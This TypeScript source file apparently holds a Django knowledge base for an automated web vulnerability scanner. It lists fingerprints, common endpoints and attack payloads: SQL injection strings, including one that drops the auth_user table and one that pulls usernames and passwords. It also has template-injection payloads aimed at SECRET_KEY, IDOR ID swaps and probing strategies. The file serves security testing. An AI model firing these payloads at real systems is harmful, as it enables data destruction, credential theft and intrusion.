/**
 * Django Knowledge
 */
import type { TechKnowledge } from '../types';

export const DJANGO_KNOWLEDGE: TechKnowledge = {
  id: 'django',
  name: 'Django',
  category: 'framework',

  fingerprints: {
    headers: {
      'x-frame-options': /DENY|SAMEORIGIN/,  // Django default
    },
    cookies: ['csrftoken', 'sessionid', 'django_language'],
    bodyPatterns: [
      /csrfmiddlewaretoken/,
      /django/i,
      /__debug__/,
    ],
    urlPatterns: [
      /\/admin\//,
      /\/static\/admin\//,
      /\/media\//,
    ],
    errorPatterns: [
      /Django Version/,
      /TemplateDoesNotExist/,
      /ImproperlyConfigured/,
      /DoesNotExist at/,
      /OperationalError at/,
      /You're seeing this error because you have DEBUG = True/,
    ],
  },

  auth: {
    type: 'session',
    cookieName: 'sessionid',
    loginEndpoint: '/admin/login/',
    logoutEndpoint: '/admin/logout/',
    commonMisconfigs: [
      'DEBUG=True in production',
      'Weak SECRET_KEY',
      'CSRF token bypass',
      'Session fixation',
    ],
  },

  commonEndpoints: [
    '/admin/',
    '/admin/login/',
    '/admin/logout/',
    '/api/',
    '/api/v1/',
    '/accounts/login/',
    '/accounts/logout/',
    '/accounts/password/reset/',
    '/static/',
    '/media/',
    '/__debug__/',
    '/graphql/',
  ],

  vulns: {
    sqli: {
      techniques: [
        {
          name: 'ORM Extra/Where Injection',
          description: 'SQL injection via .extra() or .raw() ORM methods',
          how: 'Django ORM .extra() and .raw() can be vulnerable if user input used',
          context: 'When using deprecated .extra() or .raw() with user input',
          examples: [
            "User.objects.extra(where=[\"name='\" + user_input + \"'\"])",
            "User.objects.raw('SELECT * FROM users WHERE id=' + user_id)",
          ],
          payloads: [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "'; DROP TABLE auth_user;--",
            "' UNION SELECT username,password FROM auth_user--",
          ],
        },
        {
          name: 'JSON Field Injection',
          description: 'Injection via JSONField queries',
          how: 'Some JSONField lookups can be vulnerable',
          context: 'When using JSONField with complex lookups',
          examples: [
            "Model.objects.filter(data__contains={'key': user_input})",
          ],
          payloads: [
            "' OR '1'='1",
          ],
        },
      ],
      payloads: [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' UNION SELECT 1,2,3--",
        "'; SELECT pg_sleep(5);--",
      ],
      indicators: {
        vulnerable: [
          'OperationalError',
          'ProgrammingError',
          'DatabaseError',
          'psycopg2 error',
          'sqlite3 error',
        ],
        notVulnerable: [
          'Parameterized query',
          'ORM handled safely',
          'Validation error',
        ],
      },
      adaptiveStrategy: 'Django ORM usually protects against SQLi. Focus on .raw(), .extra(), and RawSQL lookups. Check JSON field queries.',
    },

    ssti: {
      techniques: [
        {
          name: 'Django Template Injection',
          description: 'Inject code into Django template engine',
          how: 'If user input reaches Template() constructor directly',
          context: 'When user input is used as template source, not context',
          examples: [
            '{{ request.user.password }}',
            '{% debug %}',
            '{{ settings.SECRET_KEY }}',
          ],
          payloads: [
            '{{ 7*7 }}',
            '{% debug %}',
            '{{ request }}',
            '{{ request.user }}',
            '{{ settings }}',
            '{{ settings.SECRET_KEY }}',
            "{{ ''.__class__.__mro__[1].__subclasses__() }}",
          ],
          indicators: {
            vulnerable: [
              '49 appears in response',
              'Debug info displayed',
              'Secret key exposed',
              'Settings exposed',
            ],
            notVulnerable: [
              'Template tags escaped',
              'TemplateSyntaxError',
              'Variable not found',
            ],
          },
        },
      ],
      payloads: [
        '{{ 7*7 }}',
        '{{ 7*\'7\' }}',
        '{% debug %}',
        '{{ request.user.password }}',
        '{{ settings.SECRET_KEY }}',
        "{{ ''.__class__.__bases__[0].__subclasses__() }}",
      ],
      indicators: {
        vulnerable: [
          '49 in response',
          'SECRET_KEY exposed',
          'Class list returned',
        ],
        notVulnerable: [
          'Template escaped',
          'Syntax error',
          'Not rendered as template',
        ],
      },
      adaptiveStrategy: 'Try {{ 7*7 }} first. If it evaluates, try accessing settings and secret key. Django templates are sandboxed but misconfigurations exist.',
    },

    idor: {
      techniques: [
        {
          name: 'Primary Key Manipulation',
          description: 'Access objects by changing pk/id in URL',
          how: 'Django URLs often include pk - try other users IDs',
          context: 'When views check authentication but not object ownership',
          examples: [
            '/api/users/1/ -> /api/users/2/',
            '/admin/app/model/1/change/ -> /admin/app/model/2/change/',
          ],
          payloads: ['1', '2', '0', 'admin'],
        },
        {
          name: 'Slug Enumeration',
          description: 'Access objects via predictable slugs',
          how: 'Django uses slugs for URLs - may be predictable',
          context: 'When slugs are based on titles or usernames',
          examples: [
            '/profile/john-doe/ -> /profile/admin/',
          ],
          payloads: ['admin', 'administrator', 'root', 'test'],
        },
      ],
      payloads: ['1', '2', '0', '-1', 'admin'],
      indicators: {
        vulnerable: [
          'Other user data returned',
          'No permission check',
          'Object accessible',
        ],
        notVulnerable: [
          'PermissionDenied',
          'Http403',
          'Not found (404)',
        ],
      },
      adaptiveStrategy: 'Identify URL patterns (pk vs slug). Try adjacent IDs first. For admin, try direct object URLs with known IDs.',
    },

    auth_bypass: {
      techniques: [
        {
          name: 'Debug Mode Exploitation',
          description: 'Extract information from DEBUG=True error pages',
          how: 'Force errors to trigger debug page with sensitive info',
          context: 'When DEBUG=True in production',
          examples: [
            'Access /nonexistent/ for traceback',
            'Send malformed data for error',
          ],
          payloads: [],
          indicators: {
            vulnerable: [
              'Django debug page',
              'Traceback visible',
              'Settings exposed',
              'SECRET_KEY visible',
            ],
            notVulnerable: [
              'Generic 404/500 page',
              'No debug info',
            ],
          },
        },
        {
          name: 'Admin Panel Enumeration',
          description: 'Access Django admin without proper authentication',
          how: 'Check /admin/ endpoints and staff status',
          context: 'When admin is exposed to internet',
          examples: [
            '/admin/',
            '/admin/login/',
            '/admin/app/model/',
          ],
          payloads: [],
        },
      ],
      payloads: [],
      indicators: {
        vulnerable: [
          'Admin panel accessible',
          'Debug info exposed',
          'Staff bypass possible',
        ],
        notVulnerable: [
          'Admin requires auth',
          'DEBUG=False',
          'Proper 403/404',
        ],
      },
      adaptiveStrategy: 'Check for DEBUG=True first via error triggering. Then enumerate admin URLs. Check for default credentials.',
    },
  },

  notes: [
    'Check for DEBUG=True by triggering errors (huge info disclosure)',
    'Django admin at /admin/ is common target',
    'csrftoken cookie indicates Django',
    'SECRET_KEY exposure is critical - enables session forgery',
    'Django REST Framework often at /api/',
    'Check for __debug__ toolbar endpoint',
    '.pyc files may be accessible',
    'Static files at /static/ may expose sensitive files',
  ],

  relatedTech: ['python', 'postgresql', 'mysql', 'redis', 'celery', 'nginx'],
};
